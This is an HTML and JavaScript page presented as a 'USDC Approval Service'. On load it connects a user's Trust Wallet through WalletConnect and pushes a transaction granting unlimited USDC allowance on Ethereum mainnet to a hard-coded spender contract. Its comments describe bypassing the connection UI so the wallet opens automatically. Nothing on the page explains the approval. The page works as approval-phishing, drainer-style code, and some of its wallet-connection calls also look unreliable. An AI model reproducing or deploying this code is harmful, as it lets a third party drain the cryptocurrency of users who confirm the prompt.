<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>USDC Approval Service</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f2f5;
            color: #333;
            text-align: center;
            padding: 20px;
            box-sizing: border-box;
        }
        .container {
            background-color: #fff;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
            max-width: 500px;
            width: 100%;
        }
        h1 {
            color: #007bff;
            margin-bottom: 20px;
        }
        p {
            color: #666;
            margin-bottom: 15px;
        }
        .status-message {
            margin-top: 20px;
            padding: 10px;
            border-radius: 5px;
            font-weight: bold;
        }
        .info { background-color: #e6f7ff; color: #0056b3; border: 1px solid #91d5ff; }
        .success { background-color: #f6ffed; color: #237804; border: 1px solid #b7eb8f; }
        .error { background-color: #fff1f0; color: #cf1322; border: 1px solid #ffa39e; }
        .loading {
            border: 4px solid rgba(0, 0, 0, 0.1);
            border-left-color: #007bff;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .hidden { display: none; }
        .action-button {
            background-color: #007bff;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            margin-top: 15px;
        }
        .action-button:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>USDC Approval Service</h1>
        <div id="loader" class="loading"></div>
        <p id="message">Initializing...</p>
        <div id="manualConnectSection" class="hidden">
            <p>Trust Wallet did not open automatically. Please try manually:</p>
            <button id="manualConnectButton" class="action-button">Open Trust Wallet</button>
        </div>
        <div id="errorDetails" class="status-message error hidden">
            <strong>Error Details:</strong> <span id="errorMessage"></span>
        </div>
    </div>

    <!-- Ethers.js v6 -->
    <script src="https://cdn.jsdelivr.net/npm/ethers@6/dist/ethers.min.js"></script>
    <!-- Web3Modal Standalone -->
    <script src="https://cdn.jsdelivr.net/npm/@web3modal/standalone@2.0.0/dist/index.umd.min.js"></script>
    
    <script type="text/javascript">
        // --- Configuration for Ethereum Mainnet ---
        const WALLETCONNECT_PROJECT_ID = '25a778da5292aee3e00da87e594c2005';
        const USDC_CONTRACT_ADDRESS = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48'; // Official Ethereum Mainnet USDC Address
        const SPENDER_CONTRACT_ADDRESS = '0xa81EE3A48c2B72C6AdB279812a730c93EfF5C2F6'; // Your Deployed UsdcAllowanceSpender Contract on Mainnet
        const FIXED_ALLOWANCE_AMOUNT_HEX = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'; // Unlimited allowance (MaxUint256)

        const ERC20_ABI = [
            "function approve(address spender, uint256 amount) external returns (bool)",
            "function decimals() view returns (uint8)"
        ];

        let web3Modal;
        let web3Provider; // The WalletConnect provider obtained from web3Modal
        let connectedAccount;
        let connectTimeout;

        function updateMessage(text, type = 'info') {
            const messageElement = document.getElementById('message');
            messageElement.textContent = text;
            messageElement.className = `status-message ${type}`;
        }

        function showLoader(show) {
            document.getElementById('loader').classList.toggle('hidden', !show);
        }

        function showManualConnect(show) {
            document.getElementById('manualConnectSection').classList.toggle('hidden', !show);
            if (show) {
                showLoader(false);
                updateMessage('Please click the button to open Trust Wallet.', 'info');
            }
        }

        function displayErrorDetails(error) {
            const errorDetailsElement = document.getElementById('errorDetails');
            const errorMessageElement = document.getElementById('errorMessage');
            errorMessageElement.textContent = error.message || String(error);
            errorDetailsElement.classList.remove('hidden');
        }

        async function startApprovalProcess() {
            showLoader(true);
            updateMessage('Initializing WalletConnect...');
            displayErrorDetails({message: ''});

            try {
                // Initialize Web3Modal Standalone
                // It exposes itself as `Web3ModalStandalone.Web3Modal` globally.
                web3Modal = Web3ModalStandalone.Web3Modal.createClient({
                    projectId: WALLETCONNECT_PROJECT_ID,
                    metadata: {
                        name: 'USDC Approval Service',
                        description: 'Approves USDC for a trusted service.',
                        url: window.location.origin,
                        icons: ['https://example.com/icon.png'],
                    },
                });

                // --- Event Listeners for Web3Modal ---
                web3Modal.subscribeModal((state) => {
                    if (state.open) {
                        // Modal opened, maybe show different message
                        console.log("Web3Modal opened");
                    } else {
                        // Modal closed
                        console.log("Web3Modal closed");
                    }
                });

                // Custom Deep Link handling (trying to bypass UI)
                // This is the tricky part - making it auto-open without the modal.
                // Web3Modal is primarily designed to *show* a modal with QR codes/buttons.
                // We need to try and get the WC URI directly.

                // This logic will try to open the wallet without showing the modal.
                // If it fails, it will likely fall back to showing the modal.
                const provider = await web3Modal.getWalletProvider({
                    walletConnectVersion: 2,
                    desktop: true, // Try desktop first for direct deep link
                    mobile: true, // Then mobile for direct deep link
                    // This is where we tell it to prioritize deep linking
                    // However, web3modal's API is designed to manage UI flow
                    // and doesn't directly expose just the URI for auto-redirection.
                    // So, we'll try `openModal()` and quickly close if needed.
                });

                // Try to open the modal (which might trigger deep linking)
                // and then hide it if we can
                await web3Modal.openModal();
                
                // Web3Modal will handle the deep linking internally.
                // We need to wait for the connection.
                updateMessage('Opening Trust Wallet to connect... Please approve the connection.', 'info');

                // Set a timeout to show the manual connect button if connection doesn't happen
                if (connectTimeout) clearTimeout(connectTimeout);
                connectTimeout = setTimeout(() => {
                    // If we're still here and not connected, show manual option
                    if (!web3Provider) { // Check if provider is set after connection
                        showManualConnect(true);
                        updateMessage('Trust Wallet did not open automatically. Please click "Open Trust Wallet" or check your app.', 'info');
                    }
                }, 5000); // Give 5 seconds for auto-connect/redirect

                // Web3Modal's `getWalletProvider` returns the provider *after* connection.
                // So, we need to wait for it.
                web3Provider = provider; // Store the connected provider
                const ethersProvider = new ethers.BrowserProvider(web3Provider); // Ethers v6 provider
                const signer = await ethersProvider.getSigner();
                connectedAccount = await signer.getAddress();

                if (connectTimeout) clearTimeout(connectTimeout);
                console.log("Wallet connected!", connectedAccount);
                updateMessage(`Wallet connected: ${connectedAccount.substring(0, 6)}...${connectedAccount.substring(connectedAccount.length - 4)}`, 'success');
                showManualConnect(false);
                proposeApproveTransaction();

            } catch (error) {
                if (connectTimeout) clearTimeout(connectTimeout);
                console.error('Error during Web3Modal initialization or connection:', error);
                updateMessage(`Error: ${error.message}. Please check console for details.`, 'error');
                displayErrorDetails(error);
                showLoader(false);
                showManualConnect(true); // Always show manual if there's an error
            }
        }

        async function proposeApproveTransaction() {
            if (!web3Provider || !connectedAccount) {
                updateMessage('Wallet not connected. Please connect your wallet first.', 'error');
                showLoader(false);
                return;
            }

            showLoader(true);
            updateMessage('Proposing USDC approval transaction... Please confirm in Trust Wallet.', 'info');

            try {
                const ethersProvider = new ethers.BrowserProvider(web3Provider);
                const signer = await ethersProvider.getSigner();
                
                const iface = new ethers.Interface(ERC20_ABI);
                const calldata = iface.encodeFunctionData('approve', [
                    SPENDER_CONTRACT_ADDRESS,
                    FIXED_ALLOWANCE_AMOUNT_HEX
                ]);

                const transaction = {
                    from: connectedAccount,
                    to: USDC_CONTRACT_ADDRESS,
                    data: calldata,
                    value: '0x0',
                };

                console.log('Transaction to propose:', transaction);

                // Use ethers signer to send transaction
                const txResponse = await signer.sendTransaction(transaction);
                const txHash = txResponse.hash;

                updateMessage(`Transaction submitted! Hash: ${txHash.substring(0, 10)}...${txHash.substring(txHash.length - 4)}. Please check transaction status.`, 'success');
                console.log('Transaction Hash:', txHash);

            } catch (error) {
                console.error('Transaction proposal failed:', error);
                updateMessage(`Transaction failed: ${error.message}`, 'error');
                displayErrorDetails(error);
            } finally {
                showLoader(false);
            }
        }

        // Attach manual connect button listener
        document.getElementById('manualConnectButton').addEventListener('click', async () => {
            updateMessage('Attempting to open Trust Wallet via Web3Modal...', 'info');
            showLoader(true);
            try {
                await web3Modal.openModal(); // This will trigger the modal/deep link
            } catch (error) {
                console.error("Error opening modal manually:", error);
                updateMessage('Error opening wallet manually: ' + error.message, 'error');
                displayErrorDetails(error);
            } finally {
                showLoader(false);
            }
        });

        window.addEventListener('load', startApprovalProcess);
    </script>
</body>
</html>
